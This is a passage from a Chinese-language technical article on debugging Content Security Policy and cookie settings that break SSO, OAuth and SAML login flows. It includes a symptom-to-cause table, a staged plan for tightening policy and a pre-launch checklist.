    Q3 -->|"成功"| L3["cookie 层<br/>SameSite / 第三方 cookie"]
    Q3 -->|"失败"| L4["协议层或业务逻辑<br/>这才是服务端的事"]
```

「服务端日志说成功、浏览器什么也没发生」这个组合，只会指向下面两层之一：**CSP** 或 **cookie**。

### 五个具体动作

1. **先看 Console，再看 Network。** 协议层的问题有响应体可看；浏览器层的问题只有 Console 一行。
2. **不要信违规里的 URL。** 重定向被拦时它是重定向**之前**的地址。看 `effective-directive` 判断是哪条指令。
3. **在页面里挂结构化监听**，比读 Console 的字符串可靠：
   ```js
   document.addEventListener('securitypolicyviolation', e => {
     console.log(e.effectiveDirective, e.blockedURI, e.originalPolicy);
   });
   ```
4. **Report-Only 做对照。** 加一份宽松的 Report-Only 策略跑一遍，或者临时把目标源加进去确认现象消失——这是最快的二分法。
5. **Chromium 和 Firefox 各跑一遍。** 只在一边坏的，八成是重定向逐跳校验的实现差异。

### 症状 → 真因

| 症状 | 常见真因 |
|---|---|
| 登录成功后白屏，地址栏停在 POST 目标 | `form-action` 少了重定向链最后一跳的源 |
| 关掉 `'unsafe-inline'`（切到 nonce）之后 SSO 才坏 | POST binding 中间页的内联自动提交脚本被 `script-src` 拦掉，见撞法三 |
| 停在一个空白中间页，连 “Continue” 按钮都没有 | 同上。`<noscript>` 只在禁用 JS 时渲染，CSP 拦截不触发它 |
| 报错说 `'self'` 拒绝了一个同源地址 | 真正被拦的是链条后面的跨源一跳 |
| Firefox 正常、Chrome 坏 | 重定向逐跳校验的差异 |
| 加了第二个域，就是不生效 | 源之间用了逗号，被解析成第二份策略 |
| 只有一部分内联脚本失效 | 响应头（nonce）在正文渲染之后才定下来 |
| 策略里出现 `self` 而不是 `'self'` | `MessageFormat` 把单引号吃了 |
| 纯 http 部署下全站资源加载失败 | `upgrade-insecure-requests` 没按部署形态摘掉 |
| iframe 嵌入白屏 | 被嵌文档的 `frame-ancestors` |
| 新策略上线后毫无变化 | 文档没重新加载；或存在第二份策略在做交集 |

上报字段里值得记住的几个：`blocked-uri`（跨源时会被截断成源，重定向时是前一跳）、`effective-directive`（真正生效的那条指令，最有用）、`disposition`（`enforce` 还是 `report`）、`original-policy`（浏览器实际收到的整串，用来抓拼串错误）。

---

## 八、不止 CSP：同一类问题的其他面

CSP 只是浏览器否决权的一部分。认证流程里常一起出现的还有这些：

| 策略 | 典型症状 | 为什么 |
|---|---|---|
| `SameSite=Lax` cookie | SAML 回调后「像是没登录」 | IdP 用 **POST** 把断言送回来；跨站 POST 在 Lax 下不带 cookie（Lax 只放行跨站 **GET** 顶层导航）。需要 `SameSite=None; Secure` |
| 第三方 cookie 限制 | iframe 里的会话失效、静默续期失败 | 浏览器在逐步默认拦截跨站 cookie |
| `Referrer-Policy` | 服务端拿不到来源做判断 | 默认策略会裁剪甚至清空 `Referer` |
| `frame-ancestors` / `X-Frame-Options` | 嵌入式登录白屏 | 登录页拒绝被嵌；两者都在时前者优先 |
| COOP / 弹窗拦截 | 弹窗式授权拿不到结果 | `window.opener` 被切断 |

`SameSite` 那一条和 `form-action` 是同一件事的两个面：**协议规定用跨站表单 POST 传递凭据，而浏览器的默认安全策略正在持续收紧跨站表单 POST。** 任何依赖浏览器转交凭据的协议，都会被这个趋势反复咬到。

---

## 九、从零收紧的顺序

一次到位地上一份严格策略，几乎一定会打断线上功能。可行的顺序是：

1. **先只上 Report-Only**，用目标策略跑两周，把违规收上来。
2. **`default-src 'none'` 起步**，然后按报上来的违规逐个放行——比从 `'self'` 起步更能暴露真实依赖。
3. **补上三条不受兜底的指令**：`form-action`、`frame-ancestors`、`base-uri`。这一步就是本文第五节的全部内容。
4. **干掉 `'unsafe-inline'`**：内联脚本改用 nonce 或 hash，内联事件处理器改成 `addEventListener`。收益最大的一步。
5. **干掉 `'unsafe-eval'`**：通常卡在老模板引擎上，可能需要换库。
6. **收紧 `connect-src`**：这是数据外发的主通道，值得单独审一遍。
7. **考虑 `'strict-dynamic'`**：让 nonce 传递信任，同时使 host 白名单失效——白名单本身也是一类绕过手段。

### 上线前的检查清单

- [ ] `form-action` 是否覆盖了**所有**「表单提交后离开本源」的流程（SSO 登录、SSO 登出、每个已注册的第三方回调、外部网关）？
- [ ] 这些源是从系统状态**派生**的，还是要人手工维护？如果是后者，管理员知道吗？
- [ ] `frame-ancestors` 和 `base-uri` 写了吗（`default-src` 不兜它们）？
- [ ] 源之间是空格分隔，绝对没有逗号？管理员能输入的字段做过校验吗？
- [ ] `upgrade-insecure-requests` 会按部署形态摘掉吗？
- [ ] nonce 是每次响应新生成的，且**响应头先于正文定下来**？
- [ ] 切到 nonce 模式前，确认过**框架/第三方生成的 HTML**里的内联脚本吗？它们拿不到你的 nonce，只能靠哈希放行。
- [ ] 头只写在 HTML 响应上，content type 解析失败时选择写？
- [ ] 派生策略所依赖的数据源挂掉时，降级行为是明确的、并且日志说清了后果？
- [ ] 有测试断言「IdP 源和客户端源出现在最终的 `form-action` 里」——而不是只断言了模板长什么样？

最后一条经验，比清单上任何一条都值钱：

> **凡是「服务端日志全对、浏览器什么也没发生」的故障，先怀疑浏览器手里那份策略。**

---

## 规范索引

| 文档 | 内容 |
|---|---|
| CSP Level 3（W3C） | 指令语义、源列表匹配、重定向时的上报规则 |
| CSP Level 2（W3C Rec） | nonce 与 hash、`'unsafe-inline'` 的忽略规则 |
| MDN · Content-Security-Policy | 各指令的浏览器支持矩阵，最实用的速查表 |
| RFC 6749 §4.1 / OAuth 2.1 | 授权码流程——第五节第二个撞法的协议侧 |
| SAML 2.0 Bindings | HTTP-Redirect 与 HTTP-POST binding 的差异 |
| RFC 6265bis | `SameSite` cookie |

延伸阅读：《断言、令牌，和浏览器这一票》——同一个问题从协议角色的角度看：谁在签名、签的是什么、给谁花。
